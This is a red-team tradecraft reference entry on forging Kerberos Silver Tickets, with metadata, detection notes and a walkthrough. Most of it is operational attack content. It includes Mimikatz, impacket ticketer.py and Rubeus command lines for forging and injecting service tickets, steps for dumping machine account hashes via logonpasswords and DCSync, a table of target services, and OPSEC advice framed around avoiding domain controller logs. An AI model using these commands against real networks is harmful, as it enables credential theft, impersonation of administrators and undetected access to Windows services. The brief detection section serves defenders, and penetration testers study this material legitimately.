---
name: Silver Ticket
category: kerberos
subcategories: [ticket-forgery, service-impersonation, no-dc-required]
tradecraft_tags: [silver-ticket, kerberos, forged-tgs, no-dc, service-ticket, technique]
mitre_attack:
  - id: T1558.002
    name: Steal or Forge Kerberos Tickets — Silver Ticket
source:
  url: https://attack.mitre.org/techniques/T1558/002/
  license: none
  maintained: false
binary_type: none
binary_filename: ""
supported_os: [windows]
architecture: [x64]
privilege_required: none
network_required: false
detection_signal: |
  Silver tickets bypass DC validation — they are NOT logged as TGT or TGS requests
  on the DC because the service decrypts them locally. Detection requires: Event Log
  4769 absence combined with authenticated service access (service logs the auth locally).
  Silver tickets may contain unusual group memberships or missing PAC fields detectable
  by some EDR solutions that validate ticket content.
usage_examples:
  - description: Forge a silver ticket for CIFS service (Mimikatz)
    args: "kerberos::golden /user:Administrator /domain:north.sevenkingdoms.local /sid:S-1-5-21-... /target:WINTERFELL.north.sevenkingdoms.local /service:cifs /rc4:<computer-nthash> /ptt"
  - description: Forge silver ticket via Rubeus (from S4U2self output)
    args: "(use /altservice in Rubeus s4u to rewrite an existing TGS for a different service)"
  - description: Forge via impacket-ticketer
    args: "ticketer.py -nthash <service-nthash> -domain-sid S-1-5-21-... -domain domain.local -spn cifs/TARGET administrator"
opsec_notes: |
  Silver tickets are stealthy because they bypass the KDC — no TGT or TGS request
  appears in DC logs for the forged service access. However, the service account's NT hash
  must be known. The ticket is limited to a single service on a single host.
  PAC validation by the service is the primary detection method — services that strictly
  validate PAC signatures will reject forged tickets. With Mimikatz silver-ticket syntax
  (`kerberos::golden /target /service ...`), include `/ptt` for in-memory injection; if
  `/ptt` is omitted, Mimikatz writes the forged ticket to `ticket.kirbi` in the current
  working directory.
gotchas: |
  Requires the service account's NT hash (not the domain krbtgt). For computer accounts
  (CIFS on a workstation), need the machine account hash (from Mimikatz or DCSync for
  `VICTIM$`). Silver tickets don't contain a valid PAC from the KDC — some services
  (particularly Exchange, SharePoint, and Kerberos FAST-protected services) validate the
  PAC signature against the KDC, which will fail for forged tickets. Use Golden Tickets
  for services requiring valid PAC verification.
related_ttps: [mimikatz, rubeus, impacket-ticketer, pass-the-ticket, constrained-delegation-abuse]
alternatives: [golden-ticket, pass-the-ticket, s4u-chain]
common_args: {}
last_updated: 2026-06-08
---

# Silver Ticket

A forged Kerberos service ticket (TGS) signed with a service account's NT hash rather
than obtained from the KDC. Because the KDC is not involved, there are no TGS request
events on the DC. The ticket grants access to a specific service on a specific host,
impersonating any specified user.

## When to Use Silver Tickets

| Scenario | Better choice |
|----------|--------------|
| Service account hash known, DC access unavailable | Silver Ticket |
| Need persistent access to specific service | Silver Ticket |
| Need DA-equivalent access to all services | Golden Ticket |
| Have delegation credentials | S4U chain (Rubeus s4u) |

## Forgery Process

```
Prerequisite: Service account NT hash (for machine account: $COMPUTER$ hash)

1. Get service account hash:
   - For machine account: Mimikatz sekurlsa::logonpasswords (on target machine = gets computer account hash)
   - DCSync: mimikatz lsadump::dcsync /user:VICTIM$
   - SharpKatz/Apollo dcsync: /user:VICTIM$

2. Forge the ticket (Mimikatz):
   kerberos::golden /user:Administrator /domain:DOMAIN \
     /sid:S-1-5-21-... /target:TARGET.DOMAIN \
     /service:cifs /rc4:<hash> /ptt

   OPSEC: omit `/ptt` only when you intentionally want Mimikatz to write
   `ticket.kirbi`; use `/ticket:<path>` only for deliberate file output.

3. Access the service as Administrator without domain contact
```

## Common Silver Ticket Targets

| Service | SPN format | What it grants |
|---------|-----------|---------------|
| CIFS | `cifs/HOST.DOMAIN` | SMB file/admin share access |
| HOST | `host/HOST.DOMAIN` | WMI, PSRemote, scheduled tasks |
| HTTP | `http/HOST.DOMAIN` | Web service access |
| WSMAN | `wsman/HOST.DOMAIN` | WinRM access |
| MSSQL | `MSSQLSvc/HOST.DOMAIN` | SQL Server access |

## /altservice (Rubeus Silver Ticket from S4U)

Rubeus' S4U chain with `/altservice` creates a silver-ticket-style TGS by rewriting
the service name in an S4U2self-obtained TGS:
```
Rubeus.exe s4u /user:X /rc4:HASH /impersonateuser:Admin \
  /msdsspn:cifs/TARGET /altservice:host,winrm,cifs /ptt
```
This creates multiple service tickets for the same target machine from one S4U chain.
